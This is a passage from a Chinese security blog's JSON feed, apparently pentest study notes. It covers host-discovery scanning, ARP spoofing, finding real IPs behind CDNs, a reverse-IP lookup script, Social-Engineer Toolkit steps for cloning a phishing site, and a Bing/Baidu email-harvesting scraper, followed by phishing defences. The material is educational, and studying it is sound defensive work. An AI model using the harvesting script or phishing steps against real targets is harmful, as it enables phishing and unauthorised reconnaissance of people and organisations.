options.IP:\n    # 代码意思举例：192.168.1.1-120\n    # 通过'-'进行分割，把192.168.1.1和120进行分离\n    # 把192.168.1.1通过','进行分割,取最后一个数作为range函数的start,然后把120+1作为range函数的stop\n    # 这样循环遍历出需要扫描的IP地址\n        for i in range(int(options.IP.split('-')[0].split('.')[3]), int(options.IP.split('-')[1]) + 1):\n            Scan(\n            options.IP.split('.')[0] + '.' + options.IP.split('.')[1] + '.' + options.IP.split('.')[\n                2] + '.' + str(i))\n            time.sleep(0.2)\n    else:\n        Scan(options.IP)\n\n    print(&quot;\\nScan finished!....\\n&quot;)\n\nif __name__ == &quot;__main__&quot;:\n    try:\n        main()\n    except KeyboardInterrupt:\n        print(&quot;interrupted by user, killing all threads...&quot;)\n</code></pre>\n<h2 id=\"tcpudp\"><a class=\"anchor\" href=\"#tcpudp\">#</a> TCP&amp;UDP</h2>\n<p>传输层主要负责向两个主机中进程之间的通信提供服务。包括：传输控制协议（TCP）和用户数据报协议（UDP）</p>\n<h3 id=\"概述\"><a class=\"anchor\" href=\"#概述\">#</a> 概述</h3>\n<ol>\n<li>TCP<br />\n 为两台计算机之间提供面向连接、可靠的字节流服务。一台计算机发出的字节流无差错地发往网络上的其他计算机，由于其可靠的传输方式，故传输速度较慢。</li>\n<li>UDP<br />\n 是一个简单的面向数据报的传输层协议。提供的是非面向连接的、不可靠的数据流传输。UDP 在传输数据报前不用在客户和服务器之间建立一个连接，且没有超时重发等机制，故传输速度很快。</li>\n</ol>\n<h3 id=\"tcp探测存活主机\"><a class=\"anchor\" href=\"#tcp探测存活主机\">#</a> TCP 探测存活主机</h3>\n<p>tcp 报文</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303171754479.png\" alt=\"image-20230317175413383\" /></p>\n<ol>\n<li>URG：表示紧急指针是否有效；</li>\n<li>ACK：表示确认号是否有效，携带 ACK 标志的数据报文段为确认报文段；</li>\n<li>PSH：表示是带有 PUSH 标志的数据，指示接收方应该尽快将这个报文段交给应用层而不用等待缓冲区装满；</li>\n<li>RST：表示出现严重差错。可能需要重现创建 TCP 连接。还可以用于拒绝非法的报文段和拒绝连接请求；</li>\n<li>SYN：表示这是连接请求或是连接接受请求，用于创建连接和使顺序号同步；</li>\n<li>FIN：表示发送方没有数据要传输了，要求释放连接；</li>\n</ol>\n<p>利用 TCP 的三次握手原理进行主机存活探测，当向目标主句直接发送 ACK 数据包时，如果目标主机存活就会返回一个 RST 数据包，以终止这个不支持的链接。其工作原理主要以来于目标主句响应数据包的 flags 指端，如果这个 flags 字段有值则表示主机存活，</p>\n<h3 id=\"udp主机存活探测\"><a class=\"anchor\" href=\"#udp主机存活探测\">#</a> UDP 主机存活探测</h3>\n<p>UDP 是一种利用 IP 提供面向无连接的网络通信服务，UDP 会把应用程序发来的数据，在收到的一刻立即原样发送到网络上，即使在网络传输过程中出现丢包、顺序错乱等情况，UDP 也不会负责重新发送以及纠错。</p>\n<h2 id=\"arp\"><a class=\"anchor\" href=\"#arp\">#</a> ARP</h2>\n<h3 id=\"概述-2\"><a class=\"anchor\" href=\"#概述-2\">#</a> 概述</h3>\n<p>地址解析协议 (ARP,Address Resolution Protocol) 根据 IP 地址获取物理地址的一个 TCP/IP 协议。以太网协议规定，同一网段中的一台主机要和另一台主机进行直接通信，必须知道目标主机的 MAC 地址，此时需要 ARP 协议来完成 IP 地址到 MAC 地址的转换。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303171811601.png\" alt=\"image-20230317181124564\" /></p>\n<ol>\n<li>PC1 知道 PC3 的 IP 地址为 192.168.1.3，然后 PC1 会检查自己的 APR 缓存表中是否有 PC3 对应的 MAC 地址。</li>\n<li>如果 PC1 有 PC3 MAC 地址，则进行通信。如果没有，PC1 通过广播方式给网络上的每一台主机发送 ARP 请求，询问 192.168.1.3 对应的 MAC 地址。ARP 请求中同时也包含了 PC1 的 IP 地址和 MAC 地址。以太网内的所有主机都会接收到 ARP 请求，并检查是否与自己的 IP 地址匹配。如果不匹配，则丢弃该 ARP 请求。</li>\n<li>PC3 确定 ARP 请求中的 IP 地址与自己的 IP 地址匹配，则将 ARP 请求中 PC1 的 IP 地址和 MAC 地址添加到本地 ARP 缓存中。PC3 将自己的 MAC 地址发送给 PC1。</li>\n<li>PC1 收到 PC3 的 ARP 响应时，将 PC3 的 IP 地址和 MAC 地址都更新到本地 ARP 缓存表中。</li>\n</ol>\n<h3 id=\"arp主机欺骗\"><a class=\"anchor\" href=\"#arp主机欺骗\">#</a> ARP 主机欺骗</h3>\n<p>ARP 欺骗 (ARP spoofing) 又称 ARP 毒化，是针对以太网地址解析协议的一种攻击技术。通过 ARP 欺骗可让攻击者获取局域网上的数据包甚至可篡改数据包，并且可让网络上特定计算机或所有计算机无法正常连线。</p>\n<pre><code>假设一个网络环境中有三台主机，分别为主机A、B、C。详细信息如下描述：\nA的地址为：IP：192.168.10.1 MAC: AA-AA-AA-AA-AA-AA\nB的地址为：IP：192.168.10.2 MAC: BB-BB-BB-BB-BB-BB\nC的地址为：IP：192.168.10.3 MAC: CC-CC-CC-CC-CC-CC\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303171814633.png\" alt=\"image-20230317181431599\" /></p>\n<ol>\n<li>B 向 A 发送一个自己伪造的 ARP 应答，而这个应答中的数据发送方的 IP 地址是 192.168.10.3（C 的 IP 地址），MAC 地址是 BB-BB-BB-BB-BB-BB（C 的 MAC 地址本来应该是 CC-CC-CC-CC-CC-CC，这里 C 被伪造了）。</li>\n<li>当 A 接收到 B 伪造的 ARP 应答，会更新本地的 ARP 缓存（A 被欺骗了），这时 B 就伪装成 C 了。</li>\n<li>同时，B 同样向 C 发送一个 ARP 应答，应答包中发送方 IP 地址是 192.168.10.1（A 的 IP 地址），MAC 地址是 BB-BB-BB-BB-BB-BB（A 的 MAC 地址本来应该是 AA-AA-AA-AA-AA-AA）。</li>\n<li>当 C 收到 B 伪造的 ARP 应答，也会更新本地 ARP 缓存（C 也被欺骗了），这时 B 就伪装成了 A。这样主机 A 和 C 都被主机 B 欺骗，A 和 C 之间通讯的数据都经过了 B，主机 B 完全可以知道他们之间传输的任何信息。这就是典型的 ARP 欺骗过程。</li>\n</ol>\n<h3 id=\"arp主机发现的原理\"><a class=\"anchor\" href=\"#arp主机发现的原理\">#</a> ARP 主机发现的原理</h3>\n<p>当目标主机与我们处于同一个以太网的时候，可以利用 ARP 协议进行主机发现，该种扫描方式速度较快、识别精准。我们通过利用 Scapy 进行 ARP 主机发现，若主机存活，则会响应我们的 ARP 请求，否则不会响应。</p>\n<h2 id=\"端口指纹识别\"><a class=\"anchor\" href=\"#端口指纹识别\">#</a> 端口指纹识别</h2>\n<h3 id=\"概述-3\"><a class=\"anchor\" href=\"#概述-3\">#</a> 概述</h3>\n<p>在 Internet 上，各主机间通过 TCP/IP 协议发送和接收数据包，各个数据包根据其目的主机的 ip 地址来进行互联网络中的路由选择，把数据包顺利的传送到目的主机进程分配协议端口。</p>\n<p>简单来说，如果把服务器看作一栋房子，那么端口就是可以进出这栋房子的门。真正的房子只有一个或几个门，服务器至多有 65536 个门。不同的端口（门）可以指向不同的服务（房间）。</p>\n<h3 id=\"常用端口对应的服务\"><a class=\"anchor\" href=\"#常用端口对应的服务\">#</a> 常用端口对应的服务</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303171838057.png\" alt=\"image-20230317183857978\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303171839596.png\" alt=\"image-20230317183908525\" /></p>\n<h2 id=\"敏感目录探测\"><a class=\"anchor\" href=\"#敏感目录探测\">#</a> 敏感目录探测</h2>\n<h3 id=\"概述-4\"><a class=\"anchor\" href=\"#概述-4\">#</a> 概述</h3>\n<p>敏感目录探测属于信息搜集的一部分，善于发现隐藏的信息。例如：备份文件、数据库、网站路径、后门文件、管理后台登陆界面等，对渗透测试具有事半功倍的作用。</p>\n<p>通常用于进行敏感目录的常见工具有：</p>\n<ol>\n<li>御剑目录爆破工具</li>\n<li>Dirsearch</li>\n<li>DirBrute</li>\n<li>7kbscan-WebPathBrute</li>\n</ol>\n<h4 id=\"response状态码\"><a class=\"anchor\" href=\"#response状态码\">#</a> Response 状态码</h4>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303171847429.png\" alt=\"image-20230317184701370\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303171847944.png\" alt=\"image-20230317184725880\" /></p>\n<p>敏感目录探测作用:</p>\n<ol>\n<li>探测网站真实目录；</li>\n<li>探测系统敏感目录；</li>\n<li>探测 web 服务备份文件；</li>\n<li>查询网站右后门文件；</li>\n</ol>\n",
            "tags": [
                "Web",
                "主动信息收集"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/03/20/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "url": "https://blog.xcu.icu/2023/03/20/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "title": "被动信息收集",
            "date_published": "2023-03-19T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>在渗透测试的过程中，无论你是在进行 web 渗透还是，内网渗透还是域渗透，收集到关于目标系统更加全面的信息是非常重要的，信息收集贯穿整个渗透测试的生命周期中，通常我们将信息收集分为主动信息收集和被动信息收集</p>\n<p>被动信息收集</p>\n<p>主要是指不与目标主机进行直接交互，通常根据搜索引擎或者社交等方式间接的获取目标服务器的信息。常见的信息收集主要包括：子域名收集，IP 地址查询，域名反查，whois 查询，邮件收集，github 源码泄露等</p>\n<h2 id=\"域名查ip\"><a class=\"anchor\" href=\"#域名查ip\">#</a> 域名查 IP</h2>\n<p>IP 查询是通过当前所获取到的 url 去查询对应 ip 地址的过程</p>\n<ol>\n<li>\n<p>可以应用 Socket 库函数中的 gethostbyname () 函数获域名对应的 ip 值</p>\n<pre><code class=\"language-python\">import socket\n\nprint(socket.gethostbyname('www.baidu.com'))\n</code></pre>\n</li>\n<li>\n<p>也可以直接去 ping 域名</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303131342359.png\" alt=\"image-20230313134257301\" /></p>\n</li>\n</ol>\n<p>但是这样拿到的 ip 不一定是真实 ip，可能存在 CDN，我们可以通过这个网站<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuMTdjZS5jb20v\"> http://www.baidu.com GET 测试结果 网站速度测试 17CE</span> 通过全国各地的 ping，看域名是否一致，如果不一致我们就可以认定，这里打开了 CDN，反之一直就可以认定其为真实 ip</p>\n<h3 id=\"绕过cdn查找真实ip\"><a class=\"anchor\" href=\"#绕过cdn查找真实ip\">#</a> 绕过 CDN 查找真实 IP</h3>\n<p>CDN 是 Content Delivery Network 的缩写，翻译成中文是内容分发网络。它是一种通过在全球范围内部署服务器来提高网站访问速度和性能的技术。CDN 的主要目的是通过将网站的静态资源（如图片、视频、CSS、JavaScript 等）缓存到离用户更近的服务器上，从而加快用户访问网站的速度。当用户请求访问网站时，CDN 会自动选择离用户最近的服务器来提供内容，从而减少了网络延迟和带宽使用，提高了网站的访问速度和性能。</p>\n<p>下面几种常见的绕过 CDN 防护寻找真实 ip 的方法:</p>\n<ul>\n<li>目标邮件系统：一般的邮件系统都在内部，没有进行 CDN 解析，通过目标网站的用户注册 / 登录等功能，寻找邮件服务器域名 ip</li>\n<li>扫描敏感文件：如 phpinfo 泄露，github 信息泄露，命令执行等，可在敏感文件中寻找到真实 ip</li>\n<li>国外访问：国内的 CDN 往往只对国内的用户访问加速，因此可通过国外的代理，或者服务器访问，可能会拿到真实 ip</li>\n<li>分站域名：很多服务器主站的访问量会比较大，所以主站挂 dns，但是分站没有 CDN</li>\n<li>利用<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWN1cml0eXRyYWlscy5jb20v\"> Access denied (securitytrails.com)</span> 平台，查找历史记录来寻找到真实 ip</li>\n</ul>\n<h3 id=\"验证获取的ip地址\"><a class=\"anchor\" href=\"#验证获取的ip地址\">#</a> 验证获取的 ip 地址</h3>\n<ol>\n<li>找到目标的真实 IP 后，如果是 web 服务，最简单的方式就是直接用 IP 访问，看响应的页面和访问域名的一致</li>\n<li>借助端口扫描工具，扫描对应的 IP 地址，并以 IP 地址加端口的形式进行访问，观察响应结果是否和目标站点一致</li>\n<li>借助第三方工具，查看该 ip 绑定的域名是否相同</li>\n</ol>\n<h2 id=\"whois查询和ip反查\"><a class=\"anchor\" href=\"#whois查询和ip反查\">#</a> whois 查询和 ip 反查</h2>\n<h3 id=\"whois查询\"><a class=\"anchor\" href=\"#whois查询\">#</a> whois 查询</h3>\n<p>whois 查询是用来查询域名的 ip 以及所有者信息的传输协议，简单地说，whois 就是一个数据库，用来查询域名是否已经被注册，以及注册域名的详细信息（如域名所有人，域名注册商等）。python 中的模块 python-whois 可用于 whois 的查询</p>\n<p>安装模块命令：</p>\n<pre><code class=\"language-perl\">pip install python-whois\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303142100043.png\" alt=\"image-20230314210018924\" /></p>\n<p>使用</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303142101019.png\" alt=\"image-20230314210151250\" /></p>\n<h3 id=\"ip反查绑定域名\"><a class=\"anchor\" href=\"#ip反查绑定域名\">#</a> ip 反查绑定域名</h3>\n<p>当访问 ip 地址，查询不到网站目录，此时可以通过查询目标 IP 绑定的 url，通过访问该域名访问目标网站，多网站进行 web 渗透，常使用两个网站<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaXRlLmlwMTM4LmNvbS8=\">域名查 iP 域名解析 iP 查询网站 iP 反查域名 iP 反查网站 同一 iP 网站 同 iP 网站域名 iP 查询 (ip138.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kbnMuYWl6aGFuLmNvbS8yMjIuMTQwLjIzLjEzMy8=\">222.140.23.133 属于河南省 许昌市 魏都区 联通_IP 反查域名_同 IP 站点查询_同 ip 网站查询_爱站网 (aizhan.com)</span></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303142107615.png\" alt=\"image-20230314210706544\" /></p>\n<p>这里既然是 python 骗，这里贴上一个大佬的 python 脚本</p>\n<pre><code class=\"language-python\">import requests\nfrom bs4 import BeautifulSoup\nimport re\nfrom optparse import OptionParser\n\n\ndef main():\n    parser = OptionParser(&quot;Usage:%prog -i &lt;target host&gt; &quot;)   # 输出帮助信息\n    parser.add_option('-i',type='string',dest='IP',help='specify target host')   # 获取ip地址参数\n    options,args = parser.parse_args()\n    print(&quot;Search for &quot; + options.IP + &quot;\\n&quot;)\n    headers = &#123;'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',\n               'Accept': '*/*'\n               &#125;\n    url = &quot;https://site.ip138.com/&quot;+options.IP\n    r = requests.get(url,headers=headers)\n    pattern = re.compile('&lt;li&gt;&lt;span class=&quot;date&quot;.*?&lt;/li&gt;',re.S)\n    content = re.findall(pattern,r.text)\n    for line in content:\n        soup = BeautifulSoup(line,'lxml')\n        url = soup.a.attrs['href']\n        print(url.strip('/'))\n\nif __name__ == &quot;__main__&quot;:\n    try:\n        main()\n    except KeyboardInterrupt:\n        print(&quot;interrupted by user, killing all threads...&quot;)\n</code></pre>\n<h2 id=\"web指纹识别\"><a class=\"anchor\" href=\"#web指纹识别\">#</a> web 指纹识别</h2>\n<p>主要是为了探究目标网站的 CMS，通过网上已经公开的快速的进行漏洞验证对目标渗透测试过程中，目标的 cms 是十分重要的信息，有了目标的 cms，就可以利用相关 bug 进行测试，进行代码审计等。</p>\n<p>有很多开源的工具和指纹库，如 fofa、WhatWeb、w11scan、WebEye.</p>\n<h2 id=\"域名解析\"><a class=\"anchor\" href=\"#域名解析\">#</a> 域名解析</h2>\n<p>DNS 是互联网上作为域名和 ip 地址相互映射的一个分布式数据库，通过 DNS 使得用户更方便的访问互联网，而不是去记忆能够被机器读取的 IP 地址，简单来说就是将域名解析成 IP 地址</p>\n<p>域名解析的特点：IP 地址对域名是一对多的关系</p>\n<p>常见的解析类型：</p>\n<ol>\n<li>A 记录解析：有被称为 ip 指向，用户可以在此设置子域名并指向到自己的目标主机 ip 地址上，从而通过域名找到服务器 （一一对应）</li>\n<li>CNAME 记录解析：有被称为别名指向，把域名解析到另一个地址，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS10ZXN0LWY5NmczMTVnd3gyYXB1dS5teWRvbWFpbi5jb20=\">比如设置 test.mydomain.com</span>，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS13d3ctcDE4ZG9odmRzMTFjbzgzYXQ1aGVtYXc1MGsucmRkbnMueG4tLWNvbXRlc3Qtb2I0a3M5YmEzMDNsdmthdDYxZ3EyM2YyZTZkLm15ZG9tYWluLnhuLS1jb213d3ctcng4aTIyN20ybmNkM2F1MTViLnJkZG5zLmNvbQ==\">用来指向一个主机 www.rddns.com 那么以后就可以用 test.mydomain.com 来代替方法 www.rddns.com</span></li>\n<li>MX 记录解析：有被称为邮件交换记录，用于以该域名为结尾的电子邮箱指向邮件服务器，如：用户所有的邮件结尾是以域名 mydomain.com 结尾，则需要在管理界面添加该域名的 MX 记录来处理所有以 @mydomain.com 结尾的邮件</li>\n</ol>\n<h3 id=\"域名服务器\"><a class=\"anchor\" href=\"#域名服务器\">#</a> 域名服务器</h3>\n<p>根域名服务器：主要用来管理互联网的主目录，世界一个有 13 个根域名服务器，名字分别是 A 到 M</p>\n<p>顶级域名服务器：顶级域名就是在根域名的前面加上你自己定义的字母或者数字等字符</p>\n<p>二级域名服务器：当注册了一个顶级域名服务器后，列入 web.cn 就可以在互联网服务提供商的 dns 解析系统上面自由的分配二级域名或者三级域名</p>\n<p>权威名称服务器：名称服务器（DNS 服务器），用于保存特定域 / 地址的实际 DNS 记录（A,CNAME,PTR 等）。</p>\n<h2 id=\"基于搜索引擎的子域名收集\"><a class=\"anchor\" href=\"#基于搜索引擎的子域名收集\">#</a> 基于搜索引擎的子域名收集</h2>\n<ol>\n<li>Site：特定域名下进行搜索。</li>\n<li>Domain：查询自身网站的外部链接。</li>\n<li>Inurl：指令用于搜索查询词出现在 url 中的页面。</li>\n<li>Intitle：进行搜索含关键字的标题。</li>\n<li>Info：查找指定站点的一些基本信息。</li>\n<li>Filetype：只搜索某些特定类型的文件格式。</li>\n<li>Link：返回所有和 xxxxxxx 做了链接的 URLIndex：返回的网页中在正文部分包含关键词。</li>\n<li>Define：搜索某个词语的定义 And：利用 and 表示前后两个关键词是 “与” 的逻辑关系，例如 “SEO and 网络营销”，就会找出将包含 SEO 和网络营销有关的网站。</li>\n</ol>\n<h2 id=\"社工攻击概述\"><a class=\"anchor\" href=\"#社工攻击概述\">#</a> 社工攻击概述</h2>\n<p>下面是一个流程的攻击链</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303142235808.png\" alt=\"image-20230314223533399\" /></p>\n<p>社会工程攻击，是一种利用 “社会工程学” 来实施的网络攻击行为</p>\n<ol>\n<li>供应链攻击：针对各类软件，供应商，合作商等进行攻击的攻击方式</li>\n<li>水坑攻击：通过猜测观察目标的经常访问的网站，并入侵其中一个或者多个，植入恶意软件，达到感染该组目标中部分成员的目的</li>\n<li>物理攻击 - USB 摆渡：散播 USB 攻击：Autorun.inf，BadUSB，u 盘，鼠标，键盘，USB 风扇，USB 灯；</li>\n<li>物理攻击 - WIFI 攻击：内网 WIFI - 弱口令，内网 GuestWIFI，使用 wifi 钥匙一类的众筹密码产品</li>\n<li>物理攻击 - 人工渗透：伪造工牌，伪造工卡，伪造工作人员，物理开锁</li>\n<li>钓鱼邮件攻击：攻击这获取或者篡改邮件，病毒邮件，垃圾邮件，邮件炸弹等</li>\n</ol>\n<h2 id=\"邮件钓鱼攻击\"><a class=\"anchor\" href=\"#邮件钓鱼攻击\">#</a> 邮件钓鱼攻击</h2>\n<h3 id=\"伪造钓鱼网站\"><a class=\"anchor\" href=\"#伪造钓鱼网站\">#</a> 伪造钓鱼网站</h3>\n<p>做一个很像的前段，发一个链接让受害者去访问点击，获取受害者的账号密码</p>\n<p>使用 kali 的 Social-Engineer Toolkit</p>\n<p>首先选择社会工程学攻击</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303161920220.png\" alt=\"image-20230316192014118\" /></p>\n<p>接着选择 web 网站攻击</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303161920740.png\" alt=\"image-20230316192055686\" /></p>\n<p>接着选择 5</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303161921076.png\" alt=\"image-20230316192143018\" /></p>\n<p>接着选择 1，网站克隆</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303162010771.png\" alt=\"image-20230316201016728\" /></p>\n<p>下面就是 ip 和目标网站了</p>\n<h3 id=\"鱼叉攻击\"><a class=\"anchor\" href=\"#鱼叉攻击\">#</a> 鱼叉攻击</h3>\n<p>利用木马程序作为邮件的附件，发送到目标电脑上，诱导受害者去打开附件来感染木马</p>\n<p>传统宏文件制作钓鱼邮件</p>\n<h3 id=\"chm钓鱼\"><a class=\"anchor\" href=\"#chm钓鱼\">#</a> CHM 钓鱼</h3>\n<p>CHM 已编译的帮助文件，它是微软新一代的帮助文件格式，利用 HTML 作为源文，把帮助内容以类似数据库的形式编译存储</p>\n<h3 id=\"其他钓鱼方式\"><a class=\"anchor\" href=\"#其他钓鱼方式\">#</a> 其他钓鱼方式</h3>\n<ol>\n<li>OLE 钓鱼：<br />\n利用 word 中插入外部对象的方式</li>\n<li>LNK 钓鱼：<br />\nlnk 文件是用于指向其他文件的一种文件。这些文件通常被称为快捷方式</li>\n<li>HTA 钓鱼<br />\n HTA 钓鱼是 HTML Application 的缩写，直接讲 HTML 保持成 HTA 的格式，是一个独立的应用软件</li>\n<li>捆绑马</li>\n</ol>\n<h2 id=\"目标邮箱收集\"><a class=\"anchor\" href=\"#目标邮箱收集\">#</a> 目标邮箱收集</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9odW50ZXIuaW8v\">Find email addresses in seconds • Hunter (Email Hunter)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy52ZXJ5dnAuY29tLw==\">微匹 - 让每天都有新客户 (veryvp.com)</span></p>\n<p>上面两个网站都说用来收集邮箱的</p>\n<pre><code class=\"language-python\">#-*- coding:utf-8 -*-\nimport sys\nimport getopt\nimport requests\nfrom bs4 import BeautifulSoup\nimport re\nimport time\nimport threading\n\n#banner信息\ndef banner():\n    print('\\033[1;34m########################################################################################\\033[0m\\n'\n          '\\033[1;34m######################################\\033[1;32m贝塔安全实验室\\033[1;34m#####################################\\033[0m\\n'\n          '\\033[1;34m########################################################################################\\033[0m\\n')\n#使用规则\ndef usage():\n    print('-h: --help 帮助;')\n    print('-u: --url  域名;')\n    print('-p: --pages 页数;')\n    print('eg: python -u &quot;www.baidu.com&quot; -p 100'+'\\n')\n    sys.exit()\n##未授权函数检测\n\n#主函数，传入输入参数进入\ndef start(argv):\n    url = &quot;&quot;\n    pages = &quot;&quot;\n    if len(sys.argv) &lt; 2:\n        print(&quot;-h 帮助信息;\\n&quot;)\n        sys.exit()\n    #定义异常处理\n    try:\n        banner()\n        opts,args = getopt.getopt(argv,&quot;-u:-p:-h&quot;)\n    except getopt.GetoptError:\n        print('Error an argument!')\n        sys.exit()\n    for opt,arg in opts:\n        if opt == &quot;-u&quot;:\n            url = arg\n        elif opt == &quot;-p&quot;:\n            pages = arg\n        elif opt == &quot;-h&quot;:\n            print(usage())\n        threader(url, pages)\n\n\nclass MyThread(threading.Thread):\n    def __init__(self, func, args=()):\n        super(MyThread, self).__init__()\n        self.func = func\n        self.args = args\n\n    def run(self):\n        if self.args[1] &lt; 1:\n            pass\n        else:\n            self.result = self.func(*self.args)  # 在执行函数的同时，把结果赋值给result,然后通过get_result函数获取返回的结果\n\n    def get_result(self):\n        try:\n            return self.result\n        except Exception as e:\n            return None\n\n\ndef threader(url,pages):\n    launcher(url,pages)\n\n    #漏洞回调函数\ndef launcher(url,pages):\n    if len(pages)&lt; 1:\n        pass\n    else:\n        for page in range(1,int(pages)+1):\n            keyword(url,page)\n\n\ndef keyword(url,page):\n    threads = []\n    email_sum = []\n    email_num = []\n    key_words = ['email', 'mail', 'mailbox', '邮件', '邮箱', 'postbox']\n    for key_word in key_words:\n        t = MyThread(emails, args=(url, page,key_word))\n        t.start()\n        threads.append(t)\n    for t in threads:\n        t.join()  # 一定执行join,等待子进程执行结束，主进程再往下执行\n        email_num.append(t.get_result())\n    for email in email_num:\n        for list in email:\n            if list in email_sum:\n                pass\n            else:\n                email_sum.append(list)\n                print(list)\n\ndef emails(url,page,key_word):\n    bing_emails = bing_search(url, page, key_word)\n    baidu_emails = baidu_search(url, page, key_word)\n    sum_emails = bing_emails + baidu_emails\n    return sum_emails\n\n\n\ndef bing_search(url,page,key_word):\n    referer = &quot;http://cn.bing.com/search?q=email+site%3abaidu.com&amp;qs=n&amp;sp=-1&amp;pq=emailsite%3abaidu.com&amp;first=1&amp;FORM=PERE1&quot;\n    conn = requests.session()\n    bing_url = &quot;http://cn.bing.com/search?q=&quot; + key_word + &quot;+site%3a&quot; + url + &quot;&amp;qs=n&amp;sp=-1&amp;pq=&quot; + key_word + &quot;site%3a&quot; + url + &quot;&amp;first=&quot; + str(\n        (page-1)*10) + &quot;&amp;FORM=PERE1&quot;\n    conn.get('http://cn.bing.com', headers=headers(referer))\n    r = conn.get(bing_url, stream=True, headers=headers(referer), timeout=8)\n    emails = search_email(r.text)\n    return emails\n\ndef baidu_search(url,page,key_word):\n    email_list = []\n    emails = []\n    referer = &quot;https://www.baidu.com/s?wd=email+site%3Abaidu.com&amp;pn=1&quot;\n    baidu_url = &quot;https://www.baidu.com/s?wd=&quot;+key_word+&quot;+site%3A&quot;+url+&quot;&amp;pn=&quot;+str((page-1)*10)\n    conn = requests.session()\n    conn.get(referer,headers=headers(referer))\n    r = conn.get(baidu_url, headers=headers(referer))\n    soup = BeautifulSoup(r.text, 'lxml')\n    tagh3 = soup.find_all('h3')\n    for h3 in tagh3:\n        href = h3.find('a').get('href')\n        try:\n            r = requests.get(href, headers=headers(referer),timeout=8)\n            emails = search_email(r.text)\n        except Exception as e:\n            pass\n        for email in emails:\n            email_list.append(email)\n    return email_list\n\ndef search_email(html):\n    emails = re.findall(r&quot;[a-z0-9\\.\\-+_]+@[a-z0-9\\.\\-+_]+\\.[a-z]+&quot;,html,re.I)\n    return emails\n\ndef headers(referer):\n    headers = &#123;'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',\n               'Accept': '*/*',\n               'Accept-Language': 'en-US,en;q=0.5',\n               'Accept-Encoding': 'gzip,deflate',\n               'Referer': referer\n               &#125;\n    return headers\n\n\nif __name__ == '__main__':\n    #定义异常\n    try:\n        start(sys.argv[1:])\n    except KeyboardInterrupt:\n        print(&quot;interrupted by user, killing all threads...&quot;)\n    \n</code></pre>\n<h2 id=\"邮件钓鱼的防御\"><a class=\"anchor\" href=\"#邮件钓鱼的防御\">#</a> 邮件钓鱼的防御</h2>\n<ol>\n<li>尽量避免直接点击邮件中的网络连接以及附件文件；</li>\n<li>回复邮件时，如果回复的地址与发信人不同，要谨慎对待；</li>\n<li>对于要求提供任何关于自己隐私（如：账号名、口令、银行账号等）的邮件，要谨慎对待；</li>\n<li>不要使用很简单的口令；</li>\n<li>尽量不要使用同一个口令，不同的账号，使用不同的口令；</li>\n<li>邮件系统要及时清理；</li>\n<li>公司邮件系统安装部署安全邮件网关</li>\n</ol>\n<p>​</p>\n",
            "tags": [
                "Web",
                "被动信息收集"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/03/11/yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "url": "https://blog.xcu.icu/2023/03/11/yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "title": "yii反序列化",
            "date_published": "2023-03-11T04:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>CTFshow 做到这一块了，先简单的记录一下对 pop 链的构建，然后借助题来练习一下</p>\n<p>文章参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueWlpY2hpbmEuY29tL3R1dG9yaWFsLzEyMQ==\"> Yii2.0 路由（Route）的实现原理 - 教程 - Yii Framework 中文网 (yiichina.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU3NjcyNS9hcnRpY2xlL2RldGFpbHMvMTIzOTg2ODE5\">(66 条消息) yii 反序列化漏洞复现及利用_yii 漏洞_拓海 AE 的博客 - CSDN 博客</span></p>\n<h2 id=\"yii框架\"><a class=\"anchor\" href=\"#yii框架\">#</a> yii 框架</h2>\n<p>yii 是一个适用于 web2.0 的应用开发 php 框架<br />\n yii 是一个通用的 web 编程框架，即可以开发各种用 PHP 构建的 web 应用。因为基于组件的框架结构，比较适合大型应用开发，现在主要使用的是 2.0 这个重写的版本，它使用了 php 